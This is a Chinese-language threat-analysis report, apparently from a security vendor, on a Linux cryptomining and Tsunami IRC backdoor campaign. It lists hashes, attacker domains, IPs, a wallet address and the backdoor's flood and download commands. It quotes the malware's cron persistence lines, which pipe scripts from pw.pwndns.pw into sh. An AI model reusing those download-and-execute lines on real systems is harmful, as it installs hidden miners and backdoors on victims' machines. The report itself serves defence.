**近期一直处于低迷状态的挖矿病毒有复苏迹象，不仅“驱动人生”挖矿病毒出现频繁更新，而且还出现了多个新型挖矿病毒。近日，亚信安全截获一系列shell脚本与ELF文件，其隐藏在受感染Linux设备的计划任务中，通过定时任务的方式下载并执行挖矿程序和后门程序。**

## 详细分析

### Shell样本分析

文件名：update.sh

MD5:66881d8da46aca98e0c2aa2flaf530c0

文件大小：1372字节

格式：Linux Shell

![](https://image.3001.net/images/20200601/1590993419_5ed4a20b1a258.png!small)

该样本首先获取当前用户ID，用于后续判断是否为管理员组；获取CPU架构，以下载相匹配的恶意程序；获取设备公网IP地址，用于后续判断下载何种恶意程序。

hxxp://pw.pwndns.pw/servers/server.txt中总计列出8458条公网IP地址。当受感染设备的公网地址匹配到server.txt的列表，将下载后门程序、提升执行权限。如果脚本运行的用户属于Root组，还会进一步打开SSH服务；当受感染设备未匹配到server.txt中列出的地址时，将下载挖矿程序、提升执行权限。

下图是此脚本的运行逻辑

![](https://image.3001.net/images/20200601/1590993431_5ed4a217bf7bb.png!small)

### 下载的挖矿程序分析

文件名：x86_64_miner

MD5：812C64B55D4A28D902BF155530930B68

文件大小：2556332 字节

格式：ELF

是否有壳：UPX3.95

![](https://image.3001.net/images/20200601/1590993442_5ed4a2223ce4e.png!small)

该挖矿程序带有UPX3.95壳，脱壳后发现其是根据Xmrig程序编写的挖矿程序，带有pwnRig字符串。

![](https://image.3001.net/images/20200601/1590993449_5ed4a2296b1a5.png!small)

其通过访问/proc/hwloc-nofile-info和/proc/cpuinfo，获取CPU相关信息。

![](https://image.3001.net/images/20200601/1590993458_5ed4a2329eba6.png!small)

![](https://image.3001.net/images/20200601/1590993464_5ed4a23821a62.png!small)

通过抓包获取到钱包地址为：

46VfQmxKRmjSsMRYux3r6qJvxwdVCmZfUFkPqt1uUfikSSy2wJFbcDzdX2ZuH4hDzs7xS8Nsy5orNTMtQUJADuavC2vV1Rp

![](https://image.3001.net/images/20200601/1590993472_5ed4a240649b8.png!small)

### 下载的后门程序分析

文件名：x86_64

MD5：4FF3BA68D0F154E98222BAD4DAF0F253

文件大小：188648 字节

格式：ELF

是否有壳：UPX3.95

该后门程序同样带有UPX3.95壳，脱壳后发现其是多功能后门程序，其可以连接到IRC中继聊天C&C服务器。

![](https://image.3001.net/images/20200601/1590993488_5ed4a250c60b1.png!small)

通过PID，PPID和Time组成nick昵称，区分不同用户。

![](https://image.3001.net/images/20200601/1590993495_5ed4a25769e5b.png!small)

通过发送指令，可以对客户端执行如下操作：

 **指令**|  **功能**  
---|---  
 **376**|  加入频道  
 **433**|  生成一个新的nick name  
 **NICK**|  修改客户端Nick  
 **Tsunami**|  发起DDOS攻击  
 **KILLALL**|  中止DDOS攻击  
 **Pan**|  发起SYN flood  
 **UDP**|  发起UDP flood  
 **Enable**|  允许从此客户端发出的所有packet  
 **Disable**|  禁止从此客户端发出的所有packet  
 **GET**|  下载文件  
  
376：加入频道：

![](https://image.3001.net/images/20200601/1590993503_5ed4a25f94a53.png!small)

433：生成一个新的nick name：

![](https://image.3001.net/images/20200601/1590993509_5ed4a265d4601.png!small)

NICK：修改客户端Nick

![](https://image.3001.net/images/20200601/1590993520_5ed4a27039d18.png!small)

Tsunami：发起DDOS攻击

![](https://image.3001.net/images/20200601/1590993536_5ed4a2802b0cc.png!small)

KILLALL：中止DDOS攻击

![](https://image.3001.net/images/20200601/1590993602_5ed4a2c28a349.png!small)

Pan：发起SYN flood

![](https://image.3001.net/images/20200601/1590993571_5ed4a2a36bd89.png!small)

UDP：发起UDP flood

![](https://image.3001.net/images/20200601/1590993554_5ed4a2929d536.png!small)

Enable：允许从此客户端发出的所有packet

![](https://image.3001.net/images/20200601/1590993588_5ed4a2b418352.png!small)

Disable：禁止从此客户端发出的所有packet

![](https://image.3001.net/images/20200601/1590993646_5ed4a2ee04b0a.png!small)

GET：下载文件

![](https://image.3001.net/images/20200601/1590993654_5ed4a2f61f1cb.png!small)

HELP：显示指令用法，列出了所有可用指令及功能

![](https://image.3001.net/images/20200601/1590993664_5ed4a300e0f42.png!small)

![](https://image.3001.net/images/20200601/1590993670_5ed4a30655d49.png!small)

![](https://image.3001.net/images/20200601/1590993676_5ed4a30c2757d.png!small)

### 相关脚本文件分析

文件名：reboot.sh

MD5：ed445fa9bfa00d1235f44679c7023c6a

文件大小：2541字节

格式：Linux Shell

![](https://image.3001.net/images/20200601/1590993688_5ed4a318eec31.png!small)

其收集计算机相关信息，通过邮件发送给病毒作者。

持久化例程：

> /var/spool/cron/user中写入
>
> * * * * */var/tmp/.systemd/.systemd
>
> * * * * */var/tmp/.update/.update
>
> */10 * * * *curl -fsSL<http://pw.pwndns.pw/update.sh>| sh -s uc
>
> @reboot curl-fsSL<http://pw.pwndns.pw/reboot.sh>| sh

## 解决方案

> 尽量关闭不必要的文件共享；
>
> 采用高强度的密码，避免使用弱口令密码，并定期更换密码；
>
> 打开系统自动更新，并检测更新进行安装；

## IOCs

 **MD5**|  **文件名**|  **亚信安全检测名**  
---|---|---  
4ff3ba68d0f154e98222bad4daf0f253| x86_64| Backdoor.Linux.TSUNAMI.AMQ  
66881d8da46aca98e0c2aa2flaf530c0| update.sh| Coinminer.SH.PWMINER.A  
812C64B55D4A28D902BF155530930B68| x86_64_miner| Coinminer.Linux.TOOLBTC.AA  
ed445fa9bfa00d1235f44679c7023c6a| reboot.sh| Trojan.SH.INFOPERL.A  
  
### Domain

> Xmr-rx0.pwndns.pw
>
> pw.pwndns.pw
>
> pwn.pwndns.pw

### IP

> 185.183.97.209
>
> 185.45.192.135
>
> 51.79.74.212

 ***本文作者：亚信安全，转载请注明来自FreeBuf.COM**

